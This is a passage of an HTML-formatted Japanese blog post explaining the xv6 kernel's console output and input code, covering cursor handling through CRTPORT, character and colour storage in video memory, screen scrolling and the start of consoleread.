&lt;p&gt;つまり、以下の行では変数&lt;code class=&quot;language-text&quot;&gt;pos&lt;/code&gt;に現在のカーソルの16bitを格納しているわけです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
pos &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
pos &lt;span class=&quot;token operator&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで取得したカーソルの上位bitと下位bitの関係は以下のようになります。&lt;/p&gt;
&lt;p&gt;上位8bitがカーソルの行の位置を指し、下位8bitが何文字目かを指しています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/ac478630360bb1e1ebc49d50bbf1a5cd/0b533/image-37.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 81.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAARlAAAEZQAGA43XUAAAB4ElEQVQ4y52UiW7aQBCGjd1KTQQ4QRBzBFVRpUqN2kp9/xcBQgLGBzZHEoPNYhvzZ2eJjQNJmnalj/UMs/9eMyv5qxBRvEEY7Yg3CbcT0aeQnSeNzUMaAYsghVGMfDMMA67rotfrodvpoN+/gWVZ0HUd+nAI0zTxVluHMST6obbdbjkAY2tEUQQ/CLBYLLBcLuH7PgJuU88YQ8xXkyRbTiKgsa8KHs24ZpmfrVYY2zafYPHxFdLMs/kDJtM5prN7OO40+x47EximDXvsihjyEbP5PT/nzaHgbhUjw8SP6584r1SgaXVcEBcaahz61uoN4U/tarWG9tcr9G8HYvyKhZDYOsq2NRiOoJ6dQ5KkD6Mon9Hp3uwFKQ3SNtRHYmYKlGUFhUJBkBdIfbIsC/vktMgzor8XpHPwPC8TrNa0bGAqUiqVoKoqisXi0Qq/nJyi28utkA444OnwniAJVfi5lsvlvwu+uWXlP7d8dCnq2T9diqx8enkpL9PGwq/ff0RatC7baLYuBY0m71Oefa1WG/VGE1ffvuP2bnAouEtsKrmx48KyHdgc6xnHnYjEJqycP40J+bgssQ8fh1dLipeg5z2K/t04Ejx8vmiCMNxBAfQflR+V3cOjJ2zyi7iM/fP1BEPRt77flC1tAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/ac478630360bb1e1ebc49d50bbf1a5cd/8ac56/image-37.webp 240w,
/static/ac478630360bb1e1ebc49d50bbf1a5cd/d3be9/image-37.webp 480w,
/static/ac478630360bb1e1ebc49d50bbf1a5cd/b0a15/image-37.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/ac478630360bb1e1ebc49d50bbf1a5cd/8ff5a/image-37.png 240w,
/static/ac478630360bb1e1ebc49d50bbf1a5cd/e85cb/image-37.png 480w,
/static/ac478630360bb1e1ebc49d50bbf1a5cd/0b533/image-37.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/ac478630360bb1e1ebc49d50bbf1a5cd/0b533/image-37.png&quot;
            alt=&quot;2022/02/image-37.png&quot;
            title=&quot;2022/02/image-37.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;以下の行は、改行文字が渡された場合の挙動です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos;\n&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; pos &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; pos&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;カーソル位置が次の行の一番左端の位置になるように&lt;code class=&quot;language-text&quot;&gt;pos&lt;/code&gt;を加算しています。&lt;/p&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;BACKSPACE&lt;/code&gt;が与えられた場合はカーソル位置を一つ戻します。&lt;/p&gt;
&lt;p&gt;文字入力が与えられた場合は、16bitの文字データを格納します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; BACKSPACE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pos &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;pos&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  crt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;pos&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x0700&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// black on white&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この文字データの上位8bitには、背景と文字の色の情報が保持されます。&lt;/p&gt;
&lt;p&gt;また、下位8bitには表示する文字が指定されます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 311px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/9119764dfbb86dac586e9a998536c1a0/ffa0f/image-35.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 30.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABP0lEQVQY012RiWrjQBBE/f9/tRByrCzbClkfso7IOmZG10iWJcvOwstIgRDS8KhqKHp66EVXDaReQaMuhp4iaZBRRZWd516LjjzWVGmLliYj+1l/+sZQJi0izFlkQcnLg013vnDtb4T+O7a1RqSKcbjR1C3u/kgcJeiqoe+uDJeJkf48fPWGoxuwszwW4T7m6fEZa/mX9Xo1s91tefv3xnJp4TibGSEFt9s46+kUERmkEsRJjFKSrr/w+rydBqZUuWa/P7DZOOhaUxuapsWylnieP29flRVTCSHx/QDXPSIySeCHSKm4f/zHeTIDRVSYdSOC9xjPjwij1LyekcmCUyxIzNcnHyfSaIkqaoqymZl8XmpUXpOazNEJWahQYf+xOTgHdvaO1cMKEQg+2jujHr+or996NUf8zWC4m7x0JZ/C87uCiI7abQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/9119764dfbb86dac586e9a998536c1a0/8ac56/image-35.webp 240w,
/static/9119764dfbb86dac586e9a998536c1a0/c6a73/image-35.webp 311w&quot;
              sizes=&quot;(max-width: 311px) 100vw, 311px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/9119764dfbb86dac586e9a998536c1a0/8ff5a/image-35.png 240w,
/static/9119764dfbb86dac586e9a998536c1a0/ffa0f/image-35.png 311w&quot;
            sizes=&quot;(max-width: 311px) 100vw, 311px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/9119764dfbb86dac586e9a998536c1a0/ffa0f/image-35.png&quot;
            alt=&quot;2022/02/image-35.png&quot;
            title=&quot;2022/02/image-35.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;http://www.jamesmolloy.co.uk/tutorial_html/3.-The%20Screen.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;3.-The Screen&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;実際にデバッガで確認してみると、この処理によってコンソールに文字が表示されていることを確認できます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/287bd96654e766d4a3f99968fe97efa7/0b533/image-34.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.833333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAACYklEQVQoz4WTy08TURSHp6R2Wlpo7HTamekLSukLKO20tNPHTB8gJYSSkOhCE1cu1CiPugGi6MYYFz7+AxNXrvRf/Lwd0I0kLr7cc29yf/d37jlHGms1Buomo0STfmyTgbbOMNHC0arY2gZOrEYzVPyLJagHihym8/ya5vj+tMIbR+XtQOGqH0GykyadqIktLvbjJj2lSnNxjWaw6NIKzkRKWAtld20vlDDlAkdLeX68MPl51ubrJMPHHYX32ypSK1XFiln09CYHhSH7OQcrfC3YEiJmKE81tEI1eIOIzXCZw2yOd3sZvj1Z48tRkquRyrtBDMlKV7C0jki3Ri/VpCdSnaXZiazTWCzxYHzEyekxp8cnvJpOXS7Oz7m8OOdMnJ8dP2d6+pKpOL989hipn6pzb6nLji7STtZp3S0yjK3hRFdpR1bJaxk0Q0fTNBLJBOl0mriIo9Eoum64GIJoXCOrK0iT4pD7tTGT8ohJYSCclbD1IqOkEI2UMYIKXtmHX5bxeDxIkvQPnptVCcwh7S53OCgO2Mv2GC93sZUK20aD3eSWqH6NnJoRr6vE1BjzgXlkIez3+11kn4zP5yMgYskzRyx0Rwjm+myJP7SNJs4MIdIVlbZENdvhDSLexVtd3eYwPhPcK4wwDZtOfAs749BPtumKittag77WRPUrN5c8twrNmPNc77UFIbgj0mxH61jCmRUXzSx6sT3rxfC625OqP/Jfh39Q5r1Iw/j1pGynWgx0MTF6haHewIlvupNiRgqsyDo52XBZ9RsseQ2cRIIPkxSfH2X59NDkYr/M691lfgMT9j+/578oxQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/287bd96654e766d4a3f99968fe97efa7/8ac56/image-34.webp 240w,
/static/287bd96654e766d4a3f99968fe97efa7/d3be9/image-34.webp 480w,
/static/287bd96654e766d4a3f99968fe97efa7/b0a15/image-34.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/287bd96654e766d4a3f99968fe97efa7/8ff5a/image-34.png 240w,
/static/287bd96654e766d4a3f99968fe97efa7/e85cb/image-34.png 480w,
/static/287bd96654e766d4a3f99968fe97efa7/0b533/image-34.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/287bd96654e766d4a3f99968fe97efa7/0b533/image-34.png&quot;
            alt=&quot;2022/02/image-34.png&quot;
            title=&quot;2022/02/image-34.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;次の処理は非常にシンプルで、最大の行数である24行をオーバーした場合に、先頭行を削除してスクロールした上で、末尾の行を空行にしています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pos&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// Scroll up.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;crt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; crt&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;crt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  pos &lt;span class=&quot;token operator&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;crt&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;pos&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;crt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; pos&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最後の処理は、現在のカーソル位置を&lt;code class=&quot;language-text&quot;&gt;CRTPORT&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;CRTPORT+1&lt;/code&gt;に保存しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pos&lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pos&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
crt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;pos&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos; &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x0700&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これで&lt;code class=&quot;language-text&quot;&gt;consputc&lt;/code&gt;関数によるコンソールへの書き込みが完了します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;consolewrite&lt;/code&gt;関数に戻ったらメモリロックの解除と&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;のロックを行って終了です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token function&quot;&gt;release&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cons&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;ilock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ip&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;consoleread関数を読む&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#consoleread%E9%96%A2%E6%95%B0%E3%82%92%E8%AA%AD%E3%82%80&quot; aria-label=&quot;consoleread関数を読む permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;consoleread関数を読む&lt;/h3&gt;
&lt;p&gt;次は&lt;code class=&quot;language-text&quot;&gt;consoleread&lt;/code&gt;関数を読んでいきます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;consoleread&lt;/code&gt;関数は、&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;と読み取り先のポインタ、読み取るバッファサイズを引数として受け取ります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;consoleread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;inode&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;ip&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;dst&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; n&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint target&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token function&quot;&gt;iunlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ip&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  target &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; n&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;acquire&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cons&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;n &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;input&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;r &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; input&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;w&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
